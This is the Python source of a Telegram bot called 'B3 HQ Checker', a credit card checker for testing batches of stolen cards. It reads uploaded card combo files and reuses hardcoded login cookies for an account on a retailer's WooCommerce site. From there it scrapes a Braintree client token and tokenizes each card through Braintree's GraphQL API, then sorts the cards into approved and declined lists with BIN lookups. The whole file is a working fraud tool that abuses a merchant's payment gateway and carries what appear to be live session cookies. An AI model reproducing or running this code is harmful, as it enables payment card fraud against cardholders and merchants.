import asyncio
import random
import requests
import base64
import json
from bs4 import BeautifulSoup
from re import findall
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from DAXXMUSIC import app



approved_cards = []
declined_cards = []
invalid_format_cards = []

def binn(bin, c, re):
    binn = requests.get(f'https://bins.antipublic.cc/bins/{bin[:6]}')
    if 'Invalid BIN' in binn.text or 'not found.' in binn.text or 'Error code 521' in binn.text or 'cloudflare' in binn.text:
        return 'None'
    else:
        js = binn.json()
        brand = js['brand']
        country_name = js['country_name']
        country_flag = js['country_flag']
        country_currencies = js['country_currencies'][0]
        bank = js['bank']
        level = js['level']
        type = js['type']
        return f"""┏━━━━━━━⍟
┃ 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵 ✅
┗━━━━━━━━━━━⊛
❃ 𝗖𝗖: <code>{c}</code>
❃ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {re}
━━━━━━━━━━━━━━
↺ 𝘽𝙞𝙣 -» <code>{type}-{brand}-{level}</code>
↺ 𝘽𝙖𝙣𝙠 -» <code>{bank}</code>
↺ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>{country_name} {country_flag} {country_currencies}</code>
━━━━━━━━━━━━━━
𝘽𝙤𝙩 𝘽𝙮 - @"""

@app.on_message(filters.command("start"))
async def start(client, message):
    await message.reply("Welcome to B3 HQ Checker!\nDrop your CCs Combo file below 👇🏻\n🚀 Maximum CCs: 50 for now!\n\n- 𝘽𝙤𝙩 𝘽𝙮 - @nophq")

@app.on_message(filters.document)
async def handle_document(client, message):
    global approved_cards, declined_cards, invalid_format_cards
    approved_cards = []
    declined_cards = []
    invalid_format_cards = []

    document = message.document
    if document.mime_type == 'text/plain':
        await message.download(f"/tmp/{document.file_name}")

        with open(f"/tmp/{document.file_name}", 'r') as file:
            card_details = file.readlines()

        cookies = {
            '_ym_uid': '1712106192391042963',
            '_ym_d': '1712106192',
            'woocommerce_items_in_cart': '1',
            'woocommerce_cart_hash': 'b3f625251a30a7ac0ceb720237259af8',
            'PHPSESSID': '699mkpp6nd5pkjudrh6bao53fu',
            'wordpress_logged_in_4ddd4c2f7ec54eccc91eb05ab852e580': 'bslinux.bs-1680%7C1715648579%7C4341orIC9KSQgwAA8EUWiT3mxSHSsviiWeOuktUtEkw%7Cb70b776ef224e4e9803b64fc79acc5754f5b89facbfcecb5edc567e0086da458',
            'wp_woocommerce_session_4ddd4c2f7ec54eccc91eb05ab852e580': '230588%7C%7C1715648349%7C%7C1715644749%7C%7Cf05e16647f0341c334fb5b90bf840494',
            '_uetsid': 'c8afdb300ffa11efa6d95fea81f3a9b9',
            '_uetvid': 'f1ea41c0f15511eebfcbcde28ac09f93',
            '__kla_id': 'eyJjaWQiOiJPRGRrTXpVek9XVXRNalJoWkMwME1EUXlMVGhqTm1ZdE0yRTFZVE0wWkdWbFpEQXoiLCIkZXhjaGFuZ2VfaWQiOiJDOUxmNkp0LXRlakJXS1JmaXF2SEJHVFhGc2wxWXhoY09DOXhlTUk3dlM4LlRLWFNOSyJ9',
        }

        headers = {
            'authority': 'bigbattery.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://bigbattery.com/my-account/payment-methods/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        }

        session = requests.Session()
        r = session.get('https://bigbattery.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
        nonce = findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r.text)[0]
        aut = r.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
        base4 = str(base64.b64decode(aut))
        auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]

        for line in card_details:
            parts = line.strip().split('|')
            if len(parts) == 4:
                card_number, exp_month, exp_year, cvc = parts
                exy = exp_year[2:] if len(exp_year) == 4 else exp_year
                url = "https://payments.braintree-api.com/graphql"
                payload = json.dumps({
                    "clientSdkMetadata": {
                        "source": "client",
                        "integration": "custom",
                        "sessionId": "5f685625-f4b3-43db-ab05-f8a74dc449a0"
                    },
                    "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear bin } } }",
                    "variables": {
                        "input": {
                            "creditCard": {
                                "number": card_number,
                                "expirationMonth": exp_month,
                                "expirationYear": exy,
                                "cvv": cvc,
                                "billingAddress": {
                                    "postalCode": "94107"
                                }
                            },
                            "options": {
                                "validate": False,
                                "storeInVaultOnSuccess": False
                            },
                            "authorizationFingerprint": auth,
                            "sharedCustomerIdentifier": "",
                            "sharedCustomerIdentifierType": ""
                        }
                    }
                })
                headers = {
                    'Content-Type': 'application/json',
                    'Authorization': f'Bearer {auth}'
                }
                response = session.post(url, headers=headers, data=payload)
                if response.status_code == 200:
                    response_json = response.json()
                    if 'errors' in response_json:
                        declined_cards.append(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n𝗖𝗮𝗿𝗱: {card_number}|{exp_month}|{exp_year}|{cvc}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree Auth\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Card Issuer Declined CVV")
                    else:
                        approved_cards.append(f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n𝗖𝗮𝗿𝗱: {card_number}|{exp_month}|{exp_year}|{cvc}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree Auth\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Approved")
                else:
                    invalid_format_cards.append(f"{card_number}|{exp_month}|{exp_year}|{cvc}")
            else:
                invalid_format_cards.append(line.strip())

        total_cards = len(card_details)
        approved_count = len(approved_cards)
        declined_count = len(declined_cards)
        invalid_count = len(invalid_format_cards)

        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton(f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ({approved_count})", callback_data="view_approved")],
                [InlineKeyboardButton(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ({declined_count})", callback_data="view_declined")],
                [InlineKeyboardButton(f"𝐈𝐧𝐯𝐚𝐥𝐢𝐝👽 ({invalid_count})", callback_data="view_invalid")],
            ]
        )

        await message.reply(
            f"𝘚𝘏𝘖𝘗𝘐𝘍𝘠 + 𝘈𝘜𝘛𝘏𝘖𝘙𝘐𝘡𝘌 $5!\n \n 𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬 💳: {total_cards}\n 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅: {approved_count}\n𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌: {declined_count}\n 𝐈𝐧𝐯𝐚𝐥𝐢𝐝👽 : {invalid_count}",
            reply_markup=keyboard
        )
    else:
        await message.reply("Please upload a valid .txt file.")

@app.on_callback_query(filters.regex("view_approved"))
async def view_approved(client, callback_query):
    global approved_cards
    if approved_cards:
        approved_text = "\n\n".join(approved_cards)
        approved_cards = []  # Clear approved cards after displaying
        await callback_query.message.reply(f"𝖦𝖠𝖳𝖤𝖶𝖠𝖸: 𝖲𝖧𝖮𝖯𝖨𝖥𝖸 + 𝖠𝖴𝖳𝖧𝖮𝖱𝖨𝖹𝖤 $5:\n\n{approved_text}")
    else:
        await callback_query.message.reply("No approved cards.")
    await update_buttons(callback_query)

@app.on_callback_query(filters.regex("view_declined"))
async def view_declined(client, callback_query):
    global declined_cards
    if declined_cards:
        declined_text = "\n\n".join(declined_cards)
        declined_cards = []  # Clear declined cards after displaying
        await callback_query.message.reply(f"Declined Cards:\n{declined_text}")
    else:
        await callback_query.message.reply("No declined cards.")
    await update_buttons(callback_query)

@app.on_callback_query(filters.regex("view_invalid"))
async def view_invalid(client, callback_query):
    global invalid_format_cards
    if invalid_format_cards:
        invalid_text = "\n".join(invalid_format_cards)
        invalid_format_cards = []  # Clear invalid format cards after displaying
        await callback_query.message.reply(f"Invalid Format Cards:\n{invalid_text}")
    else:
        await callback_query.message.reply("No invalid format cards.")
    await update_buttons(callback_query)

async def update_buttons(callback_query):
    global approved_cards, declined_cards, invalid_format_cards
    approved_count = len(approved_cards)
    declined_count = len(declined_cards)
    invalid_count = len(invalid_format_cards)

    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ({approved_count})", callback_data="view_approved")],
            [InlineKeyboardButton(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ({declined_count})", callback_data="view_declined")],
            [InlineKeyboardButton(f"𝐈𝐧𝐯𝐚𝐥𝐢𝐝👽 ({invalid_count})", callback_data="view_invalid")],
        ]
    )

    await callback_query.message.edit_reply_markup(reply_markup=keyboard)
    await callback_query.answer()
